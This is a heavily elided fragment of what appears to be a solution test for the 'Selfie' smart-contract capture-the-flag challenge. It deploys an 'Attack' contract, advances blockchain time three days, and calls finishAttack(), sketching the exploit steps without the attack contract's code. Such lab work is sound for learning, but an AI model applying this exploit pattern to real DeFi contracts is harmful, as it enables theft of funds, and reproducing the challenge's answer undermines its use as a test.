...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackerFactory = await ethers.getContractFactory('Attack', deployer);
        ...
        // Advance time 3 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 3 days`

        //execute action
        await attackerContract.finishAttack()
